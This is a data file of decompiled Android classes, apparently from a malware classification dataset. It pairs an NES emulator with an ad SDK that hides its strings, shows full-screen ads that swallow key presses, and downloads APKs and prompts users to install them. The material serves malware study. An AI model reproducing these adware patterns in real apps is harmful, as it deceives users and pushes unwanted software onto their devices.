"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\com.sixfeiwo.coverscreen\S.code","public final class S {   public static final String f269a=""2.2_sixfw"".replace(""_sixfw"","""");   public static final String b=""COVERSCREEN_sixfw"".replace(""_sixfw"","""");   public static final String c=""V1_sixfw"".replace(""_sixfw"","""");   public static final String d=""/adfeiwo/c-cache/image_sixfw"".replace(""_sixfw"","""");   public static final String e=""/adfeiwo/c-cache/apk_sixfw"".replace(""_sixfw"","""");   public static final String f;   public static final String g;   public static final String h;   public static final String i;   public static final String j;   public static final String k;   public static final String l;   public static final String m;   public static final String n;   public static final String o;   public static final String p;   public static final String q;   public static final String r; static {     ""/adfeiwo/c-cache/log_sixfw"".replace(""_sixfw"","""");     f=""coverscreen_close2.png_sixfw"".replace(""_sixfw"","""");     g=""coverscreen_download2.png_sixfw"".replace(""_sixfw"","""");     h=""coverscreen_clickshow2.png_sixfw"".replace(""_sixfw"","""");     ""d_sixfw"".replace(""_sixfw"","""");     i=""download_confirm_sixfw"".replace(""_sixfw"","""");     j=""DP_FEIWO_sixfw"".replace(""_sixfw"","""");     k=""appkey_sixfw"".replace(""_sixfw"","""");     l=""show_at_screenon_platform_sixfw"".replace(""_sixfw"","""");     m=""showatscreenonuser_sixfw"".replace(""_sixfw"","""");     ""12345678_sixfw"".replace(""_sixfw"","""");     n=""dprate_sixfw"".replace(""_sixfw"","""");     o=""dpswitchdelay_sixfw"".replace(""_sixfw"","""");     p=""dpnum_sixfw"".replace(""_sixfw"","""");     q=""broadcast.route.control.close_sixfw"".replace(""_sixfw"","""");     r=""broadcast.route.control_sixfw"".replace(""_sixfw"","""");   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\com.sixfeiwo.coverscreen\SA.code","public final class SA extends Activity {   Context b;   private C0021t c;   private List d;   Handler f270a=new Handler();   private List e=new ArrayList();   private String f=null;   private BroadcastReceiver g=new C0012k(this);   public static void a(  SA sa){     if (CPManager.getInstance() == null) {       sa.finish();       return;     }     sa.f=CPManager.getInstance().d();     int intExtra=sa.getIntent().getIntExtra(""index_sixfw"".replace(""_sixfw"",""""),0);     List list=(List)sa.getIntent().getSerializableExtra(""itemList_sixfw"".replace(""_sixfw"",""""));     if (list == null || list.isEmpty()) {       sa.finish();       return;     }     DisplayMetrics displayMetrics=new DisplayMetrics();     sa.getWindowManager().getDefaultDisplay().getMetrics(displayMetrics);     int i=displayMetrics.widthPixels;     int i2=displayMetrics.heightPixels;     an.a(sa,S.j,S.o,10000);     sa.d=list;     if (sa.d.isEmpty()) {       sa.finish();     }  else {       sa.c=new B(sa,sa.d,intExtra);       sa.setContentView(sa.c,new ViewGroup.LayoutParams(-1,-1));     }   }   public final void a(  Q q){     if (q == null) {       return;     }     new StringBuilder().append(""ç‚¹å‡»ç±»åž‹ï¼š"").append(q.h());     if (P.a(getContext())) {       if (!ao.a(q.e())) {         Intent intent=new Intent(S.r);         intent.putExtra(""type_sixfw"".replace(""_sixfw"",""""),1);         intent.putExtra(""packageName_sixfw"".replace(""_sixfw"",""""),q.e());         sendBroadcast(intent);       }       JSONObject a2=H.a(getContext(),0.0d,0.0d,this.f,0,"""" + q.m(),"""");       ab abVar=new ab();       abVar.a(getContext(),I.a(),this.f,a2.toString());       abVar.a(new C0017p(this));       Z.a().a(abVar);       if (Q.f268a.equals(q.h())) {         if (P.a().a(q.f())) {           Toast.makeText(getApplicationContext(),""å·²åœ¨ä¸‹è½½ä¸­_sixfw"".replace(""_sixfw"",""""),0).show();         }  else {           Toast.makeText(getApplicationContext(),""æ­£åœ¨ä¸‹è½½  _sixfw"".replace(""_sixfw"","""") + q.d() + "" å�¯åˆ°é€šçŸ¥æ �æŸ¥çœ‹_sixfw"".replace(""_sixfw"",""""),0).show();           Y.a();           K.a().a(getContext(),q.k(),Y.a(getContext(),S.d,q.k()),null);           P.a().a(new H(q.a(),q.d(),q.k(),q.e(),q.f()),new C0015n(this,q));         }         if (this.d.isEmpty()) {           finish();           return;         }         return;       }       if (!Q.b.equals(q.h())) {         if (Q.c.equals(q.h())) {           Intent intent2=new Intent(this,(Class<?>)WA.class);           intent2.putExtra(""url_sixfw"".replace(""_sixfw"",""""),q.i());           startActivity(intent2);           if (this.d.isEmpty()) {             finish();             return;           }           return;         }         return;       }       new StringBuilder().append(""æ‰“å¼€å¾®ä¿¡å…³æ³¨ï¼š"").append(q.g());       Intent intent3=new Intent();       intent3.setFlags(335544320);       try {         intent3.setClassName(""com.tencent.mm_sixfw"".replace(""_sixfw"",""""),""com.tencent.mm.ui.qrcode.GetQRCodeInfoUI_sixfw"".replace(""_sixfw"",""""));         intent3.setData(Uri.parse(q.g()));         startActivity(intent3);       }  catch (      ActivityNotFoundException e) {         new StringBuilder().append(""æ‰“å¼€å¾®ä¿¡å…³æ³¨å¤±è´¥ï¼ˆweixinï¼‰ï¼š"").append(e);         intent3.setAction(""android.intent.action.VIEW"");         intent3.setData(Uri.parse(q.g()));         startActivity(intent3);       }       if (this.d.isEmpty()) {         finish();       }     }   }   public final void b(  Q q){     if (q == null || this.e.contains(Integer.valueOf(q.a()))) {       return;     }     this.e.add(Integer.valueOf(q.a()));     JSONObject a2=H.a(getContext(),q.m());     ab abVar=new ab();     abVar.a(getContext(),I.b(),this.f,a2.toString());     abVar.a(new C0018q(this));     Z.a().a(abVar);   }   public final Context getContext(){     if (this.b == null) {       this.b=getApplicationContext();     }     return this.b;   }   @Override public final void onCreate(  Bundle bundle){     super.onCreate(bundle);     requestWindowFeature(1);     getWindow().setBackgroundDrawable(new ColorDrawable(0));     CPManager.close(this);     FrameLayout frameLayout=new FrameLayout(this);     frameLayout.setLayoutParams(new ViewGroup.LayoutParams(-1,-1));     setContentView(frameLayout);     registerReceiver(this.g,new IntentFilter(S.q));     this.f270a.postDelayed(new RunnableC0013l(this),50L);   }   @Override protected final void onDestroy(){     super.onDestroy();     if (this.g != null) {       unregisterReceiver(this.g);     }   }   @Override public final boolean onKeyDown(  int i,  KeyEvent keyEvent){     new StringBuilder().append(""Ad Activity onKeyDown: "").append(i);     return true;   }   @Override protected final void onNewIntent(  Intent intent){     super.onNewIntent(intent);     this.f270a.postDelayed(new RunnableC0014m(this),50L);   }   @Override protected final void onResume(){     super.onResume();     if (this.c != null) {       this.c.h();     }   }   @Override protected final void onSaveInstanceState(  Bundle bundle){     super.onSaveInstanceState(bundle);   }   @Override protected final void onStop(){     super.onStop();     if (this.c != null) {       this.c.i();     }   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\com.sixfeiwo.coverscreen\SR.code","!org.eclipse.jdt.core.dom.TypeDeclaration@70606a74"
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\com.sixfeiwo.coverscreen\T.code","public class T {   public void a(  H h,  String str,  boolean z){   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\com.sixfeiwo.coverscreen\U.code","public final class U extends Thread {   Queue f271a;   H b;   String c;   final P e;   private long f=0;   private long g=0;   private int h=0;   long d=0;   public U(  P p,  H h,  T t){     this.e=p;     this.b=h;     Y.a();     this.c=Y.a(p.d,S.e,h.d());     this.f271a=new ConcurrentLinkedQueue();     a(t);   }   private void a(  int i){     new StringBuilder().append(""[DownloadCallback] doProgress, progress: "").append(i);     this.e.e.post(new X(this,i));     Iterator it=new ArrayList(this.f271a).iterator();     while (it.hasNext()) {       it.next();       H h=this.b;       String str=this.c;     }   }   private void a(  boolean z){     new StringBuilder().append(""[DownloadCallback] doComplete, success: "").append(z).append("", url: "").append(this.b.d());     this.e.e.post(new W(this,z));     Iterator it=new ArrayList(this.f271a).iterator();     while (it.hasNext()) {       ((T)it.next()).a(this.b,this.c,z);     }   }   public final void a(  T t){     if (t != null) {       this.f271a.add(t);     }   }   @Override public final void run(){     throw new UnsupportedOperationException(""Method not decompiled: com.sixfeiwo.coverscreen.U.run():void"");   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\com.sixfeiwo.coverscreen\V.code","final class V implements Runnable {   private U f272a;   public V(  U u){     this.f272a=u;   }   @Override public final void run(){     ac.a(this.f272a.e.d).a(this.f272a.b.e() + 12345,android.R.drawable.ic_menu_share,this.f272a.b.a(),this.f272a.b.a(),""å¼€å§‹ä¸‹è½½ _sixfw"".replace(""_sixfw"",""""),new Intent(),18,this.f272a.b.b(),this.f272a.d);   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\com.sixfeiwo.coverscreen\ViewOnClickListenerC0022u.code","final class ViewOnClickListenerC0022u implements View.OnClickListener {   private C0021t f305a;   public ViewOnClickListenerC0022u(  C0021t c0021t){     this.f305a=c0021t;   }   @Override public final void onClick(  View view){     this.f305a.e();   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\com.sixfeiwo.coverscreen\W.code","final class W implements Runnable {   private boolean f273a;   private U b;   public W(  U u,  boolean z){     this.b=u;     this.f273a=z;   }   @Override public final void run(){     if (!this.f273a) {       ac.a(this.b.e.d).a(this.b.b.e() + 12345,android.R.drawable.ic_menu_share,this.b.b.a(),this.b.b.a(),""ä¸‹è½½å¤±è´¥_sixfw"".replace(""_sixfw"",""""),new Intent(),16,this.b.b.b(),this.b.d);       return;     }     Intent intent=new Intent(""android.intent.action.VIEW"");     intent.addFlags(268435456);     intent.setDataAndType(Uri.fromFile(new File(this.b.c)),""application/vnd.android.package-archive_sixfw"".replace(""_sixfw"",""""));     ac.a(this.b.e.d).a(this.b.b.e() + 12345,android.R.drawable.ic_menu_share,this.b.b.a(),this.b.b.a(),""ä¸‹è½½å®Œæˆ�ï¼Œç‚¹å‡»å®‰è£…_sixfw"".replace(""_sixfw"",""""),intent,18,this.b.b.b(),this.b.d);     an.b(this.b.e.d,S.j,this.b.b.c().replace(""."",""""),this.b.b.e() + "","" + new Date().getTime());     try {       ae.a();       ae.a(this.b.e.d,this.b.c);     }  catch (    Exception e) {       Log.e(""D"","""" + e);     }   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\com.sixfeiwo.coverscreen\WA.code","public class WA extends Activity implements DownloadListener {   WebView f274a;   String b;   boolean c=false;   private TextView d;   private void a(){     this.b=getIntent().getStringExtra(""url_sixfw"".replace(""_sixfw"",""""));     if (ao.a(this.b)) {       finish();       return;     }     FrameLayout frameLayout=new FrameLayout(this);     frameLayout.setLayoutParams(new ViewGroup.LayoutParams(-1,-1));     this.f274a=new WebView(this);     this.f274a.setLayoutParams(new FrameLayout.LayoutParams(-1,-1));     this.f274a.getSettings().setJavaScriptEnabled(true);     this.f274a.getSettings().setBlockNetworkImage(true);     this.f274a.setDownloadListener(this);     this.f274a.getSettings().setUseWideViewPort(true);     this.f274a.setWebChromeClient(new F(this));     this.f274a.setWebViewClient(new G(this));     frameLayout.addView(this.f274a);     this.d=new TextView(this);     this.d.setLayoutParams(new FrameLayout.LayoutParams(-1,-2));     this.d.setPadding(al.a(this,6.0f),al.a(this,6.0f),al.a(this,6.0f),al.a(this,6.0f));     this.d.setBackgroundColor(Color.parseColor(""#66000000_sixfw"".replace(""_sixfw"","""")));     this.d.setTextColor(-1);     this.d.setTextSize(16.0f);     frameLayout.addView(this.d);     setContentView(frameLayout);     this.f274a.loadData(""<h3>Loading...</h3>_placeholder"".replace(""_placeholder"",""""),""text/html"",""UTF-8"");     this.f274a.loadUrl(""_sixfw"".replace(""_sixfw"","""") + this.b);   }   public static void a(  WA wa,  String str){     if (str == null) {       wa.d.setText("""");       wa.d.setVisibility(8);     }  else {       wa.d.setText(str);       wa.d.setVisibility(0);     }   }   @Override public void onBackPressed(){     if (this.c || this.f274a == null || !this.f274a.canGoBack()) {       super.onBackPressed();     }  else {       this.f274a.goBack();     }   }   @Override protected void onCreate(  Bundle bundle){     super.onCreate(bundle);     requestWindowFeature(1);     a();   }   @Override public void onDownloadStart(  String str,  String str2,  String str3,  String str4,  long j){     startActivity(new Intent(""android.intent.action.VIEW"",Uri.parse(str)));   }   @Override protected void onNewIntent(  Intent intent){     super.onNewIntent(intent);     a();   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\com.sixfeiwo.coverscreen\X.code","final class X implements Runnable {   private int f275a;   private U b;   public X(  U u,  int i){     this.b=u;     this.f275a=i;   }   @Override public final void run(){     ac.a(this.b.e.d).a(this.b.b.e() + 12345,android.R.drawable.ic_menu_share,this.b.b.a(),this.b.b.a(),""å·²ä¸‹è½½ _sixfw"".replace(""_sixfw"","""") + this.f275a + ""%"",new Intent(),18,this.b.b.b(),this.b.d);   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\com.sixfeiwo.coverscreen\Y.code","public final class Y {   private static Y f276a;   public static Y a(){     if (f276a == null) {       f276a=new Y();     }     return f276a;   }   public static String a(  Context context,  String str,  String str2){     String stringBuffer;     a();     String substring=str2.substring(str2.lastIndexOf(""/"") + 1,str2.length());     a();     if (!b()) {       StringBuilder sb=new StringBuilder();       a();       StringBuffer stringBuffer2=new StringBuffer();       stringBuffer2.append(context.getFilesDir().getAbsolutePath());       if (!"""".startsWith(""/"") && !context.getFilesDir().getAbsolutePath().endsWith(""/"")) {         stringBuffer2.append(""/"");       }       stringBuffer2.append("""");       File file=new File(stringBuffer2.toString());       if (!file.exists()) {         file.mkdirs();       }       return sb.append(stringBuffer2.toString()).append(substring).toString();     }     StringBuilder sb2=new StringBuilder();     a();     if (b()) {       StringBuffer stringBuffer3=new StringBuffer();       stringBuffer3.append(Environment.getExternalStorageDirectory());       if (!str.startsWith(""/"") && !Environment.getExternalStorageDirectory().toString().endsWith(""/"")) {         stringBuffer3.append(""/"");       }       stringBuffer3.append(str);       File file2=new File(stringBuffer3.toString());       if (!file2.exists()) {         new StringBuilder().append(""åˆ›å»ºæ–‡ä»¶å¤¹: "").append((Object)stringBuffer3).append("", æ˜¯å�¦æˆ�åŠŸï¼š"").append(file2.mkdirs());       }       stringBuffer=stringBuffer3.toString();     }  else {       stringBuffer=null;     }     return sb2.append(stringBuffer).append(""/"").append(substring).toString();   }   private static boolean b(){     return Environment.getExternalStorageState().equals(""mounted"");   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\com.sixfeiwo.coverscreen\Z.code","public final class Z {   private static Z f277a=null;   private ExecutorService b;   private Z(){     this.b=null;     this.b=Executors.newFixedThreadPool(5);   }   public static Z a(){     if (f277a == null) {       f277a=new Z();     }     return f277a;   }   public final void a(  ab abVar){     this.b.submit(abVar);   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\com.uugloo.uuemu\a.code","public class a extends Thread {   final Emulator f311a;   public a(  Emulator emulator){     this.f311a=emulator;   }   @Override public void run(){     this.f311a.nativeRun();   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\com.uugloo.uuemu\Cheats.code","public class Cheats {   private static final String XML_ENCODING=""UTF-8"";   private File file;   private ArrayList items=new ArrayList();   private boolean modified; public class Item {     public String code;     public boolean enabled;     public String name;     public Item(){     }     public String toString(){       return this.name == null ? this.code : String.valueOf(this.name) + ""\n"" + this.code;     }   }   public Cheats(  String str){     int lastIndexOf=str.lastIndexOf(46);     this.file=new File(String.valueOf(lastIndexOf >= 0 ? str.substring(0,lastIndexOf) : str) + "".cht"");     load();   }   private Item add(  String str,  String str2,  boolean z){     if (str == null || str.length() == 0) {       return null;     }     if (z && !nativeAdd(str)) {       return null;     }     String str3="""".equals(str2) ? null : str2;     Item item=new Item();     item.enabled=z;     item.code=str;     item.name=str3;     this.items.add(item);     return item;   }   private void load(){     BufferedInputStream bufferedInputStream;     try {       try {         BufferedInputStream bufferedInputStream2=new BufferedInputStream(new FileInputStream(this.file));         try {           XmlPullParser newPullParser=Xml.newPullParser();           newPullParser.setInput(bufferedInputStream2,XML_ENCODING);           for (int eventType=newPullParser.getEventType(); eventType != 1; eventType=newPullParser.next()) {             if (eventType == 2) {               if (newPullParser.getName().equals(""item"")) {                 add(newPullParser.getAttributeValue(null,""code""),newPullParser.getAttributeValue(null,""name""),!""true"".equals(newPullParser.getAttributeValue(null,""disabled"")));               }             }           }           if (bufferedInputStream2 != null) {             bufferedInputStream2.close();           }         }  catch (        Throwable th) {           bufferedInputStream=bufferedInputStream2;           th=th;           if (bufferedInputStream != null) {             bufferedInputStream.close();           }           throw th;         }       }  catch (      Throwable th2) {         th=th2;         bufferedInputStream=null;       }     }  catch (    FileNotFoundException e) {     } catch (    Exception e2) {       e2.printStackTrace();     }     this.modified=false;   }   public Item add(  String str,  String str2){     Item add=add(str,str2,true);     if (add != null) {       this.modified=true;     }     return add;   }   public void destroy(){     save();     int size=this.items.size();     while (true) {       int i=size - 1;       if (i < 0) {         this.items.clear();         return;       }       Item item=(Item)this.items.get(i);       if (item.enabled) {         nativeRemove(item.code);       }       size=i;     }   }   public void enable(  int i,  boolean z){     Item item=(Item)this.items.get(i);     if (item.enabled == z) {       return;     }     item.enabled=z;     if (z) {       nativeAdd(item.code);     }  else {       nativeRemove(item.code);     }     this.modified=true;   }   public final List getAll(){     return this.items;   }   public native boolean nativeAdd(  String str);   public native void nativeRemove(  String str);   public void remove(  int i){     Item item=(Item)this.items.get(i);     if (item.enabled) {       nativeRemove(item.code);     }     this.items.remove(i);     this.modified=true;   }   public void save(){     BufferedOutputStream bufferedOutputStream;     if (this.modified) {       if (this.items.size() == 0 && this.file.delete()) {         return;       }       try {         try {           bufferedOutputStream=new BufferedOutputStream(new FileOutputStream(this.file));         }  catch (        Throwable th) {           th=th;           bufferedOutputStream=null;         }         try {           XmlSerializer newSerializer=Xml.newSerializer();           newSerializer.setOutput(bufferedOutputStream,XML_ENCODING);           newSerializer.startDocument(null,null);           newSerializer.startTag(null,""cheats"");           Iterator it=this.items.iterator();           while (it.hasNext()) {             Item item=(Item)it.next();             newSerializer.startTag(null,""item"");             if (!item.enabled) {               newSerializer.attribute(null,""disabled"",""true"");             }             newSerializer.attribute(null,""code"",item.code);             if (item.name != null) {               newSerializer.attribute(null,""name"",item.name);             }             newSerializer.endTag(null,""item"");           }           newSerializer.endTag(null,""cheats"");           newSerializer.endDocument();           if (bufferedOutputStream != null) {             bufferedOutputStream.close();           }         }  catch (        Throwable th2) {           th=th2;           if (bufferedOutputStream != null) {             bufferedOutputStream.close();           }           throw th;         }       }  catch (      Exception e) {       }       this.modified=false;     }   }   public void setModified(){     this.modified=true;   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\com.uugloo.uuemu\Emulator.code","public class Emulator {   public static final int GAMEPAD_A=1;   public static final int GAMEPAD_AB=3;   public static final int GAMEPAD_A_TURBO=256;   public static final int GAMEPAD_B=2;   public static final int GAMEPAD_B_TURBO=512;   public static final int GAMEPAD_DOWN=32;   public static final int GAMEPAD_DOWN_LEFT=96;   public static final int GAMEPAD_DOWN_RIGHT=160;   public static final int GAMEPAD_LEFT=64;   public static final int GAMEPAD_RIGHT=128;   public static final int GAMEPAD_SELECT=4;   public static final int GAMEPAD_START=8;   public static final int GAMEPAD_UP=16;   public static final int GAMEPAD_UP_LEFT=80;   public static final int GAMEPAD_UP_RIGHT=144;   private static Emulator emulator;   private static String engineLib;   private Cheats cheats;   private boolean cheatsEnabled;   private String romFileName;   private Thread thread; public interface FrameUpdateListener {     int onFrameUpdate(    int i);   } public interface OnFrameDrawnListener {     void onFrameDrawn(    Canvas canvas);   }   private Emulator(  String str){     initialize(str,Integer.parseInt(Build.VERSION.SDK));     this.thread=new a(this);     this.thread.start();   }   public static Emulator createInstance(  Context context,  String str){     if (emulator == null) {       System.loadLibrary(""emu"");     }     String str2=""/data/data/"" + context.getPackageName() + ""/lib"";     if (!str.equals(engineLib)) {       engineLib=str;       loadEngine(str2,str);     }     if (emulator == null) {       emulator=new Emulator(str2);     }     return emulator;   }   public static Emulator getInstance(){     return emulator;   }   private native boolean initialize(  String str,  int i);   private static native boolean loadEngine(  String str,  String str2);   private native boolean nativeLoadROM(  String str);   public native void nativeRun();   private native void nativeUnloadROM();   public final void enableCheats(  boolean z){     this.cheatsEnabled=z;     if (this.romFileName == null) {       return;     }     if (z && this.cheats == null) {       this.cheats=new Cheats(this.romFileName);     }  else {       if (z || this.cheats == null) {         return;       }       this.cheats.destroy();       this.cheats=null;     }   }   public native void fireLightGun(  int i,  int i2);   public final Cheats getCheats(){     return this.cheats;   }   public native int getOption(  String str);   public native void getScreenshot(  Buffer buffer);   public native int getVideoHeight();   public native int getVideoWidth();   public final boolean loadROM(  String str){     if (!nativeLoadROM(str)) {       return false;     }     this.romFileName=str;     if (this.cheatsEnabled) {       this.cheats=new Cheats(str);     }     return true;   }   public native boolean loadState(  String str);   public native void pause();   public native void power();   public native void processTrackball(  int i,  int i2,  int i3,  int i4);   public native void reset();   public native void resume();   public native boolean saveState(  String str);   public native void setFrameUpdateListener(  FrameUpdateListener frameUpdateListener);   public native void setKeyStates(  int i);   public void setOption(  String str,  int i){     setOption(str,Integer.toString(i));   }   public native void setOption(  String str,  String str2);   public void setOption(  String str,  boolean z){     setOption(str,z ? ""true"" : ""false"");   }   public native void setSurface(  SurfaceHolder surfaceHolder);   public native void setSurfaceRegion(  int i,  int i2,  int i3,  int i4);   public final void unloadROM(){     nativeUnloadROM();     this.cheats=null;     this.romFileName=null;   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\com.uugloo.uuemu\EmulatorView.code","!org.eclipse.jdt.core.dom.TypeDeclaration@1765388e"
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\com.uugloo.uuemu\EmuMedia.code","public class EmuMedia {   private static SurfaceHolder holder;   private static Emulator.OnFrameDrawnListener onFrameDrawnListener;   private static AudioTrack track;   private static Rect region=new Rect();   private static float volume=AudioTrack.getMaxVolume();   static boolean audioCreate(  int i,  int i2,  int i3){     int i4=i2 == 16 ? 2 : 3;     int i5=i3 == 2 ? 3 : 2;     if (track != null && track.getSampleRate() == i && track.getAudioFormat() == i4 && track.getChannelCount() == i3) {       return true;     }     int minBufferSize=AudioTrack.getMinBufferSize(i,i5,i4) * 2;     try {       track=new AudioTrack(3,i,i5,i4,minBufferSize >= 1500 ? minBufferSize : 1500,1);       if (track.getState() == 0) {         track=null;       }     }  catch (    IllegalArgumentException e) {       track=null;     }     if (track == null) {       return false;     }     track.setStereoVolume(volume,volume);     return true;   }   static void audioDestroy(){     if (track != null) {       track.stop();       track=null;     }   }   static void audioPause(){     if (track != null) {       track.pause();     }   }   static void audioPlay(  byte[] bArr,  int i){     if (track != null) {       track.write(bArr,0,i);     }   }   static void audioSetVolume(  int i){     float minVolume=AudioTrack.getMinVolume();     volume=minVolume + (((AudioTrack.getMaxVolume() - minVolume) * i) / 100.0f);     if (track != null) {       track.setStereoVolume(volume,volume);     }   }   static void audioStart(){     if (track != null) {       track.play();     }   }   static void audioStop(){     if (track != null) {       track.stop();       track.flush();     }   }   static void bitBlt(  int[] iArr,  boolean z){     Canvas lockCanvas=holder.lockCanvas();     lockCanvas.drawColor(ViewCompat.MEASURED_STATE_MASK);     if (z) {       lockCanvas.rotate(180.0f,lockCanvas.getWidth() / 2,lockCanvas.getHeight() / 2);     }     lockCanvas.drawBitmap(iArr,0,region.width(),region.left,region.top,region.width(),region.height(),false,(Paint)null);     if (onFrameDrawnListener != null) {       onFrameDrawnListener.onFrameDrawn(lockCanvas);     }     holder.unlockCanvasAndPost(lockCanvas);   }   static void destroy(){     if (track != null) {       track.stop();       track=null;     }   }   public static void setOnFrameDrawnListener(  Emulator.OnFrameDrawnListener onFrameDrawnListener2){     onFrameDrawnListener=onFrameDrawnListener2;   }   static void setSurface(  SurfaceHolder surfaceHolder){     holder=surfaceHolder;   }   static void setSurfaceRegion(  int i,  int i2,  int i3,  int i4){     region.set(i,i2,i + i3,i2 + i4);   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\com.uugloo.uuemu\FrameUpdateListener.code","public interface FrameUpdateListener {   int onFrameUpdate(  int i); } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\com.uugloo.uuemu\Item.code","public class Item {   public String code;   public boolean enabled;   public String name;   public Item(){   }   public String toString(){     return this.name == null ? this.code : String.valueOf(this.name) + ""\n"" + this.code;   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\com.uugloo.uuemu\OnFrameDrawnListener.code","public interface OnFrameDrawnListener {   void onFrameDrawn(  Canvas canvas); } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\com.uugloo.uuemu\OnTrackballListener.code","public interface OnTrackballListener {   boolean onTrackball(  MotionEvent motionEvent); } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\com.uugloo.uuemu.nes\a.code","class a implements DialogInterface.OnClickListener {   final KeyProfilesActivity f312a;   public a(  KeyProfilesActivity keyProfilesActivity){     this.f312a=keyProfilesActivity;   }   @Override public void onClick(  DialogInterface dialogInterface,  int i){     String str;     boolean createOrRenameProfile;     str=KeyProfilesActivity.currentProfile;     KeyProfilesActivity.currentProfile=null;     createOrRenameProfile=this.f312a.createOrRenameProfile(str,((TextView)((Dialog)dialogInterface).findViewById(com.apkmore.rbjatnldymzfiw.R.id.profile_name)).getText().toString().trim());     if (createOrRenameProfile) {       this.f312a.refresh();     }  else {       Toast.makeText(this.f312a,com.apkmore.rbjatnldymzfiw.R.string.new_profile_error,0).show();     }   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\com.uugloo.uuemu.nes\array.code","public final class array {   public static final int aspect_ratio_entries=0x7f05000d;   public static final int aspect_ratio_entryvalues=0x7f050002;   public static final int auto_sync_client_entries=0x7f050014;   public static final int auto_sync_client_entryvalues=0x7f05000a;   public static final int exit_game_options=0x7f05000b;   public static final int fast_forward_speed_entryvalues=0x7f050003;   public static final int file_chooser_filters=0x7f050000;   public static final int frame_skip_entries=0x7f05000e;   public static final int frame_skip_entryvalues=0x7f050004;   public static final int orientation_entries=0x7f050013;   public static final int orientation_entryvalues=0x7f050009;   public static final int refresh_rate_entries=0x7f05000f;   public static final int refresh_rate_entryvalues=0x7f050005;   public static final int scaling_mode_entries=0x7f05000c;   public static final int scaling_mode_entryvalues=0x7f050001;   public static final int second_controller_entries=0x7f050010;   public static final int second_controller_entryvalues=0x7f050006;   public static final int vkeypad_layout_entries=0x7f050012;   public static final int vkeypad_layout_entryvalues=0x7f050008;   public static final int vkeypad_size_entries=0x7f050011;   public static final int vkeypad_size_entryvalues=0x7f050007; } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\com.uugloo.uuemu.nes\attr.code","public final class attr { } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\com.uugloo.uuemu.nes\b.code","public class b implements FilenameFilter {   final KeyProfilesActivity f313a;   public b(  KeyProfilesActivity keyProfilesActivity){     this.f313a=keyProfilesActivity;   }   @Override public boolean accept(  File file,  String str){     return str.endsWith("".xml"");   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\com.uugloo.uuemu.nes\c.code","class c implements Runnable {   final EmulatorActivity f314a;   public c(  EmulatorActivity emulatorActivity){     this.f314a=emulatorActivity;   }   @Override public void run(){     try {       Thread.sleep(2000L);     }  catch (    InterruptedException e) {       e.printStackTrace();     }     this.f314a.path=u.a(this.f314a);     if (this.f314a.path == null) {       this.f314a.finish();     }  else {       this.f314a.runOnUiThread(new d(this));     }   } } "
